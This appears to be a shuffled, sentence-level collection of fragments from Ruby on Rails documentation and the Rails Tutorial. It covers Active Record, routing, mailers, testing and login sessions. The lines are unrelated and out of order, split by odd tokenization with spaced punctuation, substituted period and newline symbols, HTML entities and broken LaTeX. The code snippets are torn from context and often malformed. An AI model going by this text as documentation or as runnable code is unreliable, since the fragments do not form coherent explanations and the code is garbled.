But this approach becomes increasingly impractical as the table size increases , since `User ▖ all ▖ each` instructs Active Record to fetch _ the entire table _ in a single pass , build a model object per row , and then keep the entire array of model objects in memory ▖
use Rack : : Sendfile
date ▖ years _ since ( 10 ) # = &gt; Sun , 07 Jun 2020
A mockup of the user signup page .
Here we &apos;ve used \ kode { rake test : models } to run just the model tests ( compare to \ kode { rake test : integration } from Section ~ \ ref { sec : layout _ link _ tests } ) .
* Deletes leading underscores , if any .
We come finally to a practical application of all our signin / out work : we &apos;ll change the layout links based on signin status .
This leads to the \ kode { edit } action shown in Listing ~ \ ref { code : account _ activation _ edit _ action } .
# # # Action Mailer Configuration for Gmail
In this vein , it might make you unhappy to write
NOTE : Bugs in the most recent released version of Ruby on Rails are likely to get the most attention ▖
This will recognize ` / photos / 1 / preview` with GET , and route to the `preview` action of `PhotosController` , with the resource id value passed in `params &#91; : id &#93; ` ▖
The status feed partial .
parts _ order : &#91; &quot; text / plain &quot; , &quot; text / enriched &quot; , &quot; text / html &quot; &#93;
As you proceed through the rest of the book , I recommend pushing and deploying the application regularly :
render file : filename , content _ type : &quot; application / rss &quot;
Note the notation \ kode { class UsersController &lt; ApplicationController } ; this is an example of a Ruby \ emph { class } with \ emph { inheritance } .
The About page at \ href { http : / / localhost : 3000 / about } { / about } .
As usual , if you &apos;re following along using Git for version control , now would be a good time to make a topic branch for modeling users :
In a book , to find all the occurrences of a given string , say ``foobar &apos; &apos; , you would have to scan each page for ``foobar &apos; &apos; ---the paper version of a full-table scan .
Of course , this simplicity is a sign of being \ emph { more } advanced , not less---we &apos;ve come a long way since our reliance on scaffolding in Chapter ~ \ ref { cha : a _ toy _ app } , and we no longer need most of its complexity .
Writing the implementation involves digging a little deeper : following and unfollowing involve \ emph { creating } and \ emph { destroying } relationships , which means defining \ kode { create } and \ kode { destroy } actions in a Relationships controller ( which we must create ) .
A \ emph { spork } is a combination spoon-fork .
This would work fine , but it would hit the database multiple times if , e ▖ g ▖ , \ kode { current \ _ user } appeared multiple times on a page .
Conveniently , Rails automatically provides such messages based on the User model validations .
To make some actual microposts , we enter information at the new microposts page , \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts / new } { / microposts / new } , as seen in Figure ~ \ ref { fig : demo _ new _ micropost } .
It keeps the list of changes for every Rails version .
The inheritance hierarchy for the ( non-built-in ) \ kode { Word } class from Listing ~ \ ref { code : word _ class } .
Otherwise , it will try to ╼ convert the value to a number using `Float` .
* `collection ▖ exists ? ( ▖ ▖ ▖ )
In addition to using the routing helpers , Rails can also create paths and URLs from an array of parameters ▖
╼ \ end { code } ╼ ╼ \ subsection { User has secure password } % ( fold ) ╼ \ label { sec : has _ secure _ password } ╼ ╼
And we &apos;ll see in Section ~ \ ref { sec : signup _ failure } how validations give us convenient error messages when users make submissions that violate them .
Then we &apos;ll lay the foundation for successful login ( Section ~ \ ref { sec : login _ success } ) by evaluating each login submission based on the validity of its email / password combination .
Dynamic Finders
╼ ╼ % subsection subsection _ name ( end ) ╼ ╼ \ subsection { Strings } % ( fold ) ╼ \ label { sec : strings } ╼ ╼
# options _ from _ collection _ for _ select ( collection , value _ method , text _ method , selected = nil )
The reason for the difference is that remember tokens and digests are created for users that already exist in the database , whereas the \ kode { before \ _ create } callback happens \ emph { before } the user has been created .
This forces us to use the older syntax , yielding
flash &#91; &quot; string &quot; &#93; = &quot; a string &quot;
Confirm Dialog &#93; ( images / getting _ started / confirm _ dialog ▖ png )
# name : string ( 255 )
( If developing on your local system , this means using a regular terminal window ; if using the cloud IDE , this means using the command-line area shown in Figure ~ \ ref { fig : ide _ anatomy } ▖ )
Defining a \ kode { Word } class in the console .
As before , we &apos;ll use Factory Girl to simulate users , but immediately we have a problem : user email addresses must be unique , which would appear to require creating more than 30 users by hand---a terribly cumbersome job .
Validating the presence of the \ kode { name } and \ kode { email } attributes .
# # # JSON support
in Listing ~ \ ref { code : demo _ microposts _ controller } .
_ first _ feed _ implementation ( end ) ╼ ╼ \ subsection { Subselects } % ( fold ) ╼ \ label { sec : scopes _ subselects _ and _ a _ lambda } ╼ ╼
That code will pull in the partial from `app / views / shared / _ menu ▖ html ▖ erb` .
This is convenient because microposts appear on both the Home page and on the user &apos;s profile page , so by using \ kode { request ▖ referrer } we arrange to redirect back to the page issuing the delete request in both cases .
On the other hand , big chunks of structured documentation may have a separate &quot; Examples &quot; section :
&quot; It worked ! &quot;
Show that you took the time to review the pull request .
The only tricky part of the implementation is realizing that we need to add two new actions to the Users controller .
Blocks can be more than one line , and often are .
`prev _ year` is aliased to `last _ year` .
Within the block , methods called on the proxy are forwarded to the receiver with their options merged ▖
Instead , you set up each route within your application separately .
Resource routing allows you to quickly declare all of the common routes for a given resourceful controller ▖
Once the API stabilizes the visibility can change , but changing public API is much harder due to backwards compatibility .
# # # # # Choosing Layouts at Runtime
= &gt; &quot; level &quot;
It is also possible to use Less with the asset pipeline ; see the \ href { http : / / rubygems ▖ org / gems / less-rails-bootstrap } { \ texttt { less-rails-bootstrap } gem } for details .
We &apos;ll remove the default page ( and replace it with a custom home page ) in Section ~ \ ref { sec : hello _ world } .
# # # # `constantize`
in Listing ~ \ ref { code : validates _ uniqueness _ of _ email } .
It just happens that you &apos;ve told the browser what request it should make next , by sending back an HTTP 302 status code .
( enter &quot; h &quot; for help ) &#91; Ynaqdh &#93;
Rails provides a generator for creating models , which most ╼ Rails developers tend to use when creating new models ▖
The pages from the tour in Section ~ \ ref { sec : a _ user _ tour } correspond to \ emph { actions } in the Users \ emph { controller } , which is a collection of related actions .
A test for the user show page .
Get the &#91; all-new version 4 &#93; ( http : / / www ▖ redcloth ▖ org ) that removed serious bugs ▖
break ;
Rails ▖ application ▖ configure do
Creates a micropost associated with \ kode { user } ( exception on failure )
in Listing ~ \ ref { code : micropost _ access _ control } .
( in / Users / lifo / Rails / blog )
* `bind`
A working status feed on the live Web .
If you already have an instance of your model , you can start a transaction and acquire the lock in one go using the following code :
# = &gt; Thu , 01 Apr 2010
As `client` is explicitly set to be a readonly object , the above code will raise an `ActiveRecord : : ReadOnlyRecord` exception when calling `client ▖ save` with an updated value of _ visits _ .
This allows you to have multiple separate caches from the same application .
To solve this issue , we add the \ kode { about } view .
As with \ kode { log \ _ in } , Listing ~ \ ref { code : log _ in _ with _ remember } defers the real work to the Sessions helper , where we define a \ kode { remember } method that calls \ kode { user ▖ remember } , thereby generating a remember token and saving its digest to the database .
# # # # # `months _ ago` , `months _ since`
In JavaScript you can use the document ▖ cookie property to read and write the document &apos;s cookie ▖
&#124; ` : words _ connector` &#124; `support ▖ array ▖ words _ connector` &#124;
Right now , the Sessions controller \ kode { create } action defines a normal ( non-instance ) variable called \ kode { user } , but if we change it to an instance variable we can test that \ kode { cookies } correctly contains the user &apos;s remember token .
X-Runtime : 0 ▖ 013483
Testing case-insensitive email uniqueness ▖
We should define an error messages partial that works regardless of the kind of object passed to it .
Although we &apos;ve defined the \ kode { password \ _ digest } attribute required by \ kode { has \ _ secure \ _ password } , sometimes it &apos;s convenient to refer to the plain ( virtual ) password as well .
attr _ name = @ base ▖ class ▖ human _ attribute _ name ( attribute , default : attr _ name )
You can pass in headers as a hash to ╼ the mail method as a parameter , mail will then create an email , either plain ╼ text , or multipart , depending on what email templates you have defined .
Finally , you can use my favorite trick by applying the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Touch _ ( Unix ) } { Unix touch command } as follows :
A couple of things to note ▖
Sass gives us even more ways to simplify our stylesheets , but the code in Listing ~ \ ref { code : refactored _ scss } uses the most important features and gives us a great start .
&lt; script src = &quot; http : / / html5shim ▖ googlecode ▖ com / svn / trunk / html5 ▖ js &quot; &gt; &lt; / script &gt;
We can create a user by entering name and email values in the text fields and then clicking the Create User button .
Default scope
Once we define the proper associations , the resulting \ kode { @ micropost } variable will automatically have a \ kode { user \ _ id } attribute equal to its associated user &apos;s id .
root to : &quot; articles # index &quot;
Note the presence of line-ending semicolons , which are characteristic of languages with syntax descended from \ href { https : / / en ▖ wikipedia ▖ org / wiki / ALGOL } { ALGOL } .
Just pass `true` to the association call :
When you define a `after _ rollback` or `after _ commit` callback , you ╼ will receive a deprecation warning about this upcoming change ▖
In particular , by using the Rails library called \ emph { Active Record } , the code in Listing ~ \ ref { code : demo _ user _ model } arranges for \ kode { User ▖ all } to return all the users in the database .
The presence of the \ kode { do } keyword indicates that \ kode { form \ _ for } takes a block with one variable , which we &apos;ve called \ kode { f } for ``form &apos; &apos; :
# &lt; / contributor &gt;
The Home page with follow stats .
The password reset form .
In Rails 5 ▖ 0 , test cases will be executed in random order by default ▖
$ git format-patch master --stdout &gt; ~ / my _ changes ▖ patch
# = &gt; { nil = &gt; &quot; &quot; , 1 = &gt; &quot; 1 &quot; , : x = &gt; &quot; A &quot; }
The email configuration in Listing ~ \ ref { code : sendgrid _ config } includes the \ kode { user \ _ name } and \ linebreak \ kode { password } of the SendGrid account , but note that they are accessed via the \ kode { ENV } environment variable instead of being hard-coded .
# # # When Does Validation Happen ?
concern : image _ attachable do
In this section , we &apos;ll add this necessary logout capability .
* ` : as`
It triggers your validations , ╼ returning true if any errors were found in the object , and false otherwise .
has _ one : account , - &gt; { includes : representative }
% w ( a b c d ) ▖ to ( 2 ) # = &gt; % w ( a b c )
The method `remove` will remove all occurrences of the pattern :
is equivalent to
To arrange for a true Red--Green cycle , see Section ~ \ ref { sec : minitest _ reporters } .
WARNING : Some parts of your application , notably routing , are not yet set up at the point where the `after _ initialize` block is called .
NOTE : The `config ▖ assets ▖ compress` initialization option is no longer used in ╼ Rails 4 to enable either CSS or JavaScript compression ▖
stylesheet _ link _ tag : all , cache : true
For example , rendering actions from the `PhotosController` class will use `app / views / layouts / photos ▖ html ▖ erb` ( or `app / views / layouts / photos ▖ builder` ) ▖
def full _ message
Computes the url to a stylesheet asset in the `app / assets / stylesheets` directory ▖
There are a wealth of Rails resources in stores and on the web---indeed , the supply is so rich that it can be overwhelming .
This code looks fine at the first sight ▖
person ▖ errors ▖ clear
# # # # # Obfuscation and Encoding Injection
As a first step toward enabling more visible changes , in Section ~ \ ref { sec : current _ user } we &apos;ll retrieve the current user from the database using the id in the session .
We &apos;ll then complete user login in Section ~ \ ref { sec : login _ success } by adding the necessary session-manipulation code .
Many examples in this book use command-line commands .
Scoping allows you to specify commonly-used queries which can be referenced as method calls on the association objects or models ▖
We could enforce this at the controller layer , but it &apos;s conventional to put it in the model and use Active Record to enforce the constraint .
$ bin / rails generate job guests _ cleanup --queue urgent
Adding microposts creation to the Home page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / } { / } ) .
( Write a test first ▖ )
* `config ▖ action _ dispatch ▖ encrypted _ cookie _ salt` sets the encrypted cookies salt ╼ value ▖
render : edit
# Generates a select field for days that defaults to the day for the date provided
I &apos;ve done my best to cover some of the most common cases , but the only general solution is web searches and determination .
It failed .
Comparing Figure ~ \ ref { fig : login _ mockup } with Figure ~ \ ref { fig : signup _ mockup } , we see that the login form is similar in appearance to the signup form , except with two fields ( email and password ) in place of four .
x + = 1
@ order = @ customer ▖ orders ▖ build ( order _ date : Time ▖ now ,
Do not expect that the issue report will automatically see any activity or that others will jump to fix it ▖
* `controls : true` , provides browser supplied controls for the user to interact with the video .
You &apos;ll see all of those paths later in this guide .
Compare this with including the action names in Listing ~ \ ref { code : generating _ pages } and Listing ~ \ ref { code : generate _ users _ controller } .
This option ╼ will let validation pass if the attribute &apos;s value is `blank ? ` , like `nil` or an ╼ empty string for example .
as shown in Listing ~ \ ref { code : settings _ link _ test } .
created _ at : &quot; 2013-03-11 00 : 57 : 46 &quot; , updated _ at : &quot; 2013-03-11 00 : 57 : 46 &quot; &gt;
end
The ``forgot password &apos; &apos; link will go to a page with a form that takes in an email address and sends an email containing a password reset link ( Figure ~ \ ref { fig : forgot _ password _ form _ mockup } ) .
# # # `overlaps ?
# # # `to _ formatted _ s`
Finally , if a block is provided , both `create` and `new` will yield the new ╼ object to that block for initialization :
As in Chapter ~ \ ref { cha : beginning } and Chapter ~ \ ref { cha : a _ toy _ app } , I suggest following the ``hello , world ! &apos; &apos;
As a result , we &apos;ll complete the implementation of secure passwords ( and get to a green test suite ) using only a few lines of code .
# # # # `to ( position ) `
cattr _ accessor : surname , instance _ accessor : false
Lean against writing tests for code ( such as detailed HTML structure ) likely to change in the future .
else
( On the cloud IDE , &lt; your system &gt; is Ubuntu ▖ )
find ~ by
Returns a set of select tags ( one for year , month , day , hour , and minute ) pre-selected for accessing a specified datetime-based attribute .
false ▖ duplicable ?
The code itself looks like this :
In particular , 0 and 0 ▖ 0 are * * not * * blank .
This is a ( nearly ) comprehensive list of differences between the 2nd edition of the \ emph { Ruby on Rails Tutorial } and the present version .
The `Blorgh : : Article` model should then have some code to convert the `author _ name` ╼ field into an actual `User` object and associate it as that article &apos;s `author` ╼ before the article is saved ▖
* Action Pack &apos;s internal Middleware stack .
* How Rails &apos; built-in helpers assist you .
╼ = &gt; Sun , 13 Mar 2011 03 : 38 : 55 UTC + 00 : 00
It is possible to do so , but experience shows that direct tests of cookie values are brittle and have a tendency to rely on implementation details that sometimes change from one Rails release to the next .
In this chapter , we &apos;ll take the first critical step by creating a \ emph { data model } for users of our site , together with a way to store that data .
This guide documents the Ruby on Rails API documentation guidelines .
However , because you are developing the `blorgh` engine on your local machine , ╼ you will need to specify the ` : path` option in your `Gemfile` :
While we &apos;re looking at the routes file , let &apos;s take a moment to associate the root route with the users index , so that ``slash &apos; &apos; goes to / users .
# Blorgh / app / models / article ▖ rb
Here is a summary of the steps shown in Figure ~ \ ref { fig : mvc _ detailed } :
╼ ╼ \ end { enumerate } ╼ ╼ % subsection micropost _ validations ( end ) ╼ ╼ \ subsection { User / Micropost associations } % ( fold ) ╼ \ label { sec : user _ micropost _ associations } ╼ ╼
To create the \ kode { relationships } table , we migrate the database as usual :
The Rails Way ™ is to use migrations every time we discover that our data model needs to change .
* `create _ association ! (
if @ user &amp; &amp; @ user ▖ guest ?
At this point , our test suite should be \ passing :
Indeed , if we have a large number of records , the entire collection may exceed the amount of memory available .
Under the hood , this command executes the \ kode { drop \ _ table } command to remove the users table from the database .
You can call this remote whatever you &apos;d like , but if you don &apos;t use `upstream` , ╼ then change the name to your own in the instructions below .
A diagram of the data model appears in Figure ~ \ ref { fig : user _ has _ many _ following } .
This defines a task \ kode { db : populate } that creates an example user with name and email address replicating our previous one , and then makes 99 more .
The result of the deployment should be a working sample application on the production server ( Figure ~ \ ref { fig : layout _ production } ) .
Although \ kode { touch } is designed to update the modification timestamp of a file or directory without otherwise affecting it , as a side-effect it creates a new ( blank ) file if one doesn &apos;t already exist .
It creates a ╼ hyperlink based on text to display and where to go - in this case , to the path ╼ for articles .
Now we &apos;ll get our title tests to pass , and at the same time add the full HTML structure needed to make valid web pages .
╼ sample application .
In particular , ╼ `qualified _ constant _ defined ? ` accepts an optional second argument to be ╼ able to say whether you want the predicate to look in the ancestors .
This is ╼ so you can easily add asset pipelining later if you like .
The ╼ `require _ tree` directive in a CSS manifest works the same way as the JavaScript ╼ one , requiring all stylesheets from the current directory .
Now that we have a user model to play with , we will just edit the ╼ `app / controllers / users _ controller ▖ rb` make it instruct the `UserMailer` to deliver ╼ an email to the newly created user by editing the create action and inserting a ╼ call to `UserMailer ▖ welcome _ email` right after the user is successfully saved .
Imagine that you did have an asset located at ╼ `app / assets / stylesheets / blorgh / style ▖ css` To include this asset inside an ╼ application , just use `stylesheet _ link _ tag` and reference the asset as if it ╼ were inside the engine :
We can double-check this by verifying that the relevant tests fail :
The second \ kode { link \ _ to } shows off the \ kode { image \ _ tag } helper , which takes as arguments the path to an image and an optional options hash , in this case setting the \ kode { alt } attribute of the image tag using symbols .
And when other frameworks develop successful new techniques , Rails creator \ href { http : / / loudthinking ▖ com / } { David Heinemeier Hansson } and the \ href { http : / / rubyonrails ▖ org / core } { Rails core team } don &apos;t hesitate to incorporate their ideas .
# # # `reorder`
message by \ href { http : / / lmgtfy ▖ com / } { Googling it } , or when to give up and just reboot the darn thing ▖ ╼ ╼ Because web applications have so many moving parts , they offer ample opportunities to develop your technical sophistication ▖ In the context of Rails web development , some specific examples of technical sophistication include making sure you &apos;re using the right Ruby gem versions , running \ texttt { bundle install } or \ texttt { bundle update } , and restarting the local webserver if something doesn &apos;t work ▖ ( Don &apos;t worry if all this sounds like gibberish ; we &apos;ll cover everything mentioned here in the course of completing this tutorial ▖ ) ╼ ╼ As you proceed through this tutorial , in all likelihood you will occasionally be tripped up by things not immediately working as expected ▖ Although some particularly tricky steps are explicitly highlighted in the text , it is impossible to anticipate all the things that can go wrong ▖ I recommend you embrace these inevitable stumbling blocks as opportunities to work on improving your technical sophistication ▖ Or , as we say in \ href { https : / / www ▖ learnenough ▖ com / command-line-tutorial # aside-speak _ geek } { geek speak } : \ emph { It &apos;s not a bug , it &apos;s a feature ! } ╼ ╼ \ end { aside } ╼ ╼ \ begin { figure } ╼ \ begin { center } ╼ \ image { images / figures / tech _ support _ cheat _ sheet ▖ png } ╼ \ end { center } ╼ \ caption { `` \ href { https : / / m ▖ xkcd ▖ com / 627 / } { Tech Support Cheat Sheet } &apos; &apos; ( via \ href { http : / / xkcd ▖ com / } { xkcd } ) ▖ \ label { fig : tech _ support _ cheat _ sheet } } ╼ \ end { figure } ╼ ╼ ╼ The \ emph {
NOTE : Defined in `active _ support / core _ ext / object / with _ options ▖ rb` .
SELECT * FROM clients WHERE removed _ at IS NULL
&lt; script src = &quot; / javascripts / all ▖ js &quot; &gt; &lt; / script &gt;
The ` : on` option takes one of the values ╼ ` : create` or ` : update` ▖
The \ kode { -rf } flag means ``recursive force &apos; &apos; , which recursively removes all files , directories , subdirectories , and so on , without asking for explicit confirmation of each deletion .
As with the generated user fixture ( Listing ~ \ ref { code : default _ fixtures } ) , the generated relationship fixture also violates the uniqueness constraint imposed by the corresponding migration ( Listing ~ \ ref { code : relationships _ migration } ) .
bsection image _ upload _ in _ production ( end ) ╼ ╼ % section micropost _ images ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : user _ microposts _ conclusion } ╼ ╼ With the addition of the Microposts resource , we are nearly finished with our sample application .
In order to forward users to their intended destination , we need to store the location of the requested page somewhere , and then redirect to that location instead .
Failed signup with error messages .
The ability to save a securely hashed \ kode { password \ _ digest } attribute to the database
Our method will be to start with a \ emph { valid } model object , set one of its attributes to something we want to be invalid , and then test that it in fact is invalid .
def validate
( As noted in Section ~ \ ref { sec : conventions } , vertical dots indicate omitted code and should not be copied literally ▖ )
( It &apos;s probably a good idea to write a test for the flash as well , which is left as an exercise ( Section ~ \ ref { sec : exercises _ a _ test _ for _ valid _ submission } ) ▖ )
A mockup of the Home page with a form for creating microposts .
&#124; app / &#124; Contains the controllers , models , views , helpers , mailers and assets for your application ▖
Fixing this minor blemish is left as an exercise ( Section ~ \ ref { sec : exercises _ testing _ the _ remember _ me _ box } ) , but for now we can just test to see if the relevant cookie is \ kode { nil } or not .
The micropost count assertion in Listing ~ \ ref { code : user _ profile _ test } uses \ kode { response ▖ body } , which we saw briefly in the Chapter ~ \ ref { cha : password _ reset } exercises ( Section ~ \ ref { sec : exercises _ password _ reset _ test } ) .
It &apos;s also easy to add new helpers to your application as it evolves .
The reason we iterate through all possible key / value pairs is so that we can include other kinds of flash messages .
&lt; % = asset _ path &apos; image ▖ png &apos; , host : &apos; mycdnsubdomain ▖ fictional-cdn ▖ com &apos; % &gt;
in Listing ~ \ ref { code : remember _ me _ ternary } .
&lt; % # WRONG % &gt;
Let &apos;s consider the latter first .
Enables the formatting of numbers in a variety of ways .
This code has a formidable combination of Rails , Ruby , and SQL , but it does the job , and does it well .
You may want to further restrict access , using environment-specific versions of these files and any others that may contain sensitive information .
# calling + to _ s + on all elements and joining them .
The biggest difference is that , while anyone can sign up , only the current user should be able to update his information .
foo = &gt; nil
* ` : password` - If your mail server requires authentication , set the password in this setting .
- &gt; { where &quot; factory = &apos; Seattle &apos; &quot; }
This option defaults to an instance of `ActiveSupport : : Logger : : SimpleFormatter` for all modes except production , where it defaults to `Logger : : Formatter` .
With the \ kode { @ user } instance variable from Listing ~ \ ref { code : initial _ edit _ action } , the edit page should render properly , as shown in Figure ~ \ ref { fig : edit _ page } .
qualified _ name = qualified _ name _ for from _ mod , const _ name
The result , with migration name \ kode { add \ _ password \ _ digest \ _ to \ _ users } , appears as follows :
Because of this danger , it is essential that we only update attributes that are safe to edit through the web .
The ╼ &#91; Routes &#93; ( # routes ) section of this guide describes it in detail .
creates \ emph { attribute accessors } corresponding to a user &apos;s name and email address .
Our eventual goal for the user profile pages is to show the user &apos;s profile image , basic user data , and a list of microposts , as mocked up in Figure ~ \ ref { fig : profile _ mockup }
Now we &apos;re ready to write the first signin element , the \ kode { sign \ _ in } function itself .
= &gt; &quot; mhartl @ example ▖ com &quot;
# Generate digests for assets URLs
* Rescues any exception returned by the application and calls an exceptions app that will wrap it in a format for the end user .
&quot; digest &quot; : &quot; 1c5752789588ac18d7e1a50b1f0fd4c2 &quot; } , &quot; favicon-a9c641bf2b81f0476e876f7c5e375969 ▖ ico &quot; : { &quot; logical _ path &quot; : &quot; favicon ▖ ico &quot; , &quot; mtime &quot; : &quot; 2013-07-26T23 : 00 : 10-07 : 00 &quot; , &quot; size &quot; : 1406 ,
As implied by the tests , the application code uses the same \ kode { create } and \ kode { destroy } actions to respond to the Ajax requests that it uses to respond to ordinary \ texttt { POST } and \ texttt { DELETE } HTTP requests .
If your tests are failing when you think they should be passing , quit the Spork server with \ texttt { Ctrl-C } and restart it :
options
Even though the tests are passing , you might have noticed this code :
```coffeescript
Finally , although there &apos;s no iron-clad way to stop attackers who have physical access to a logged-in computer , we &apos;ll minimize the fourth problem by changing tokens every time a user logs out and by taking care to \ emph { cryptographically sign } any potentially sensitive information we place on the browser .
# # # # # `prev _ month` , `next _ month`
It should look something like the following :
The rest of the tutorial focuses on developing a single large \ emph { real sample application } ( called \ kode { sample \ _ app } ) , writing all the code from scratch .
Our plan is to display the microposts for each user on their respective profile page ( \ kode { show ▖ html ▖ erb } ) , together with a running count of how many microposts they &apos;ve made .
If there are no digests in the filenames , and far-future ╼ headers are set , remote clients will never know to refetch the files when their ╼ content changes .
* Provides prepare and cleanup callbacks , intended to assist with code reloading during development .
table _ name ▖ pluralize : table _ name
The `find _ by ! ` method behaves exactly like `find _ by` , except that it will raise `ActiveRecord : : RecordNotFound` if no matching record is found ▖
in Listing ~ \ ref { code : generate _ users _ controller } .
* `set _ autoload _ paths` This initializer runs before `bootstrap _ hook` ▖
# # # # General Engine Configuration
d = Date ▖ new ( 2010 , 5 , 9 ) # = &gt; Sun , 09 May 2010
With these techniques in hand , we are well-equipped to recover from the inevitable development \ href { http : / / en ▖ wikipedia ▖ org / wiki / Military _ slang # SNAFU } { snafus } .
╼ ╼ \ subsection { What good does Git do you ? } ╼ \ label { sec : what _ good _ does _ git _ do _ you } ╼ ╼ If you &apos;ve never used version control before , it may not be entirely clear at this point what good it does you , so let me give just one example .
To do this , we &apos;ll edit the Rails \ emph { router } , which sits in front of the controller in Figure ~ \ ref { fig : MVC } and determines where to send requests that come in from the browser .
# # # # # `beginning _ of _ day` , `end _ of _ day`
In the case above , you would need to add a column named `orders _ count` to the `Customer` model ▖
As a result of my performing this step , you can find the \ href { https : / / github ▖ com / railstutorial / sample _ app _ rails _ 4 } { Rails Tutorial sample application code on GitHub } ( under the username \ texttt { railstutorial } and the slightly different name \ texttt { sample \ _ app \ _ rails \ _ 4 } )
person ▖ errors ▖ messages
# SELECT id FROM people
If a line is too long , the comment may be placed on the next line :
From the controller &apos;s point of view , there are three ways to create an HTTP response :
For many uses , the two types of strings are effectively identical :
The methods `monday` and `sunday` return the dates for the previous Monday and ╼ next Sunday , respectively .
In Section ~ \ ref { sec : adding _ to _ the _ layout } , we associated many of the HTML elements with CSS classes , which gives us considerable flexibility in constructing a layout based on CSS .
page ▖ emails ▖ create (
You could set that up this way :
&lt; % = = @ cms ▖ current _ template % &gt; &lt; % # inserts @ cms ▖ current _ template as is % &gt;
= &gt; &quot; $ 2a $ 10 $ kn4cQDJTzV76ZgDxOWk6Je9A0Ttn5sKNaGTEmT0jU7 ▖ ncBJ / 60gHq &quot;
# # # # # `collection ▖ build ( attributes = { } ) `
map { &#124; attribute , message &#124; full _ message ( attribute , message ) }
The user index page \ href { http : / / localhost : 3000 / users } { / users } with only one user ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ index _ only _ one _ bootstrap-full ▖ png } { ( full size ) }
The second method we &apos;ll need is \ kode { html } , which updates the HTML inside the relevant element with the contents of its argument .
For instance , consider a user who follows a second user : we could say that , e ▖ g ▖ , Calvin is following Hobbes , and Hobbes is followed by Calvin , so that Calvin is the \ emph { follower } and Hobbes is \ emph { followed } .
The sum of an empty receiver can be customized in this form as well :
Go ahead and try to create a new article ▖
Transfer-Encoding : chunked
would try to create the symbol \ kode { : data-turbolinks-track } , which ( it turns out ) is invalid because of the hyphens .
( By the way , under the hood Ruby actually evaluates the expression \ texttt { @ foo &#124; &#124; @ foo = &quot; bar &quot; } , which avoids an unnecessary assignment when \ texttt { @ foo } is \ texttt { nil } or \ texttt { false } .
$ git push origin branch _ name
Adding this to the Sessions controller &apos;s \ kode { create } method leads to the amazingly compact code shown in Listing ~ \ ref { code : remember _ me _ ternary } .
This means that if the strings are of different lengths , and the strings are equal when compared up to the shortest length , then the longer string is considered of higher lexical precedence than the shorter one ▖
* Sets server specific X-Sendfile header ▖
_ &apos; nosniff &apos; in Rails by default _ - stops the browser from guessing the MIME type of a file .
There &apos;s really nothing to be done about this , except to say , ``Welcome to Ruby ! &apos; &apos;
As a next step beyond reporting issues , you can help the core team resolve existing issues ▖
True by default in development and test environments , and false in production mode ▖
The method `instance _ variable _ names` returns an array ▖
* ` : odd` - Specifies the value must be an odd number if set to true ▖
tags = % w ( a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p )
Make sure to use ╼ string keys consistently .
( Indeed , the only big piece of software we &apos;ll install separately is Rails itself , and this is intentional ( Section ~ \ ref { sec : installing _ rails } ) ▖ )
# SELECT &quot; articles &quot; .
There &apos;s also `insert _ after` which will insert a middleware after another :
# # # # # Specifying Layouts for Controllers
Author : Michael Hartl &lt; michael @ michaelhartl ▖ com &gt;
Microposts , like Users , are modeled as a resource backed by an Active Record model .
in Listing ~ \ ref { code : password _ reset _ expire _ test } .
# # # Slicing
A summary of the default Rails files appears in Table ~ \ ref { table : rails _ directory _ structure } ; we &apos;ll learn about most of these files and directories throughout the rest of this book .
We will also make separate pages to show the user following and followers arrays .
-h This message
( A third technique , \ emph { mixins } , is introduced in Section ~ \ ref { sec : rails _ environments } ▖ )
belongs _ to : client , counter _ cache : true
padding : 2px ;
method _ name = &quot; _ _ bind _ # { time ▖ to _ i } _ # { time ▖ usec } &quot;
A string of followed user ids then appears as follows :
Adding some debug information to the site layout .
# # # Deploy to a subdirectory ( relative url root )
The HTML source produced by the CSS includes .
Note that `classify` returns a class name as a string ▖
* `config ▖ autoload _ once _ paths` accepts an array of paths from which Rails will autoload constants that won &apos;t be wiped per request ▖
config ▖ active _ record ▖ raise _ in _ transactional _ callbacks = true
With these views defined , the Home , Help , and About pages are the same as before , but they have much less duplication .
the user would see the usage message aligned against the left margin .
Run this command in your terminal :
The site layout with the \ kode { full \ _ title } helper ▖
&#91; 1 , 2 , 3 , 4 , 5 &#93;
{ &#124; video &#124; video ▖ category = = params &#91; : category &#93; }
Helper methods that are used in multiple fixtures should be defined on modules ╼ included in the newly introduced `ActiveRecord : : FixtureSet ▖ context _ class` , in ╼ `test _ helper ▖ rb` .
end
A mockup of the proto-feed with micropost delete links ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / micropost _ delete _ links _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Why do we need associations between models ?
By including \ kode { name : string } and \ kode { email : string } , we have arranged for the User model to have the form shown in Figure ~ \ ref { fig : demo _ user _ model } .
Most of the ideas in Listing ~ \ ref { code : password _ reset _ integration _ test } have appeared previously in this tutorial ; the only really novel element is the test of the \ kode { input } tag :
For example , `to` returns the subarray of elements up to the one at the passed index :
In the case of a Rails upgrade , that will mean every single piece of functionality in the application ▖
# # # Configuring Active Support
For top-level or anonymous modules `parent _ name` returns `nil` .
You can connect to the database by setting an environment variable `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` or by using a configuration file called `config / database ▖ yml` .
Adding the Relationship model validations .
In Rails 4 ▖ 2 , the ╼ invocation of the instance methods are deferred until either `deliver _ now` or ╼ `deliver _ later` is called ▖
in Listing ~ \ ref { code : user _ relationships _ association } .
console do
We start with the page to show all the users in our application , called \ href { http : / / localhost : 3000 / users } { \ texttt { index } } ; as you might expect , initially there are no users at all ( Figure ~ \ ref { fig : demo _ blank _ user _ index _ rails _ 3 } ) .
format ▖ text { render text : &apos; Render text &apos; }
If you still need the feature you can add the &#91; Active Resource gem &#93; ( https : / / github ▖ com / rails / activeresource ) in your Gemfile .
With the addition of the status feed , we &apos;ve finished the sample application for the \ emph { Ruby on Rails Tutorial } .
Adding microposts to the user \ kode { show } page .
With the code in Listing ~ \ ref { code : user _ create _ action } , our signup form is actually working , but before submitting a valid registration in a browser we &apos;re going to add a bit of polish common in web applications : a message that appears on the subsequent page ( in this case , welcoming our new user to the application ) and then disappears upon visiting a second page or on page reload .
The two share a common `lib` ╼ directory structure , and are both generated using the `rails plugin new` ╼ generator ▖
raise ArgumentError , &quot; Regexp multiline option not allowed in routing requirements : # { requirement ▖ inspect } &quot;
If your application has to execute commands in the underlying operating system , there are several methods in Ruby : exec ( command ) , syscall ( command ) , system ( command ) and `command` ▖
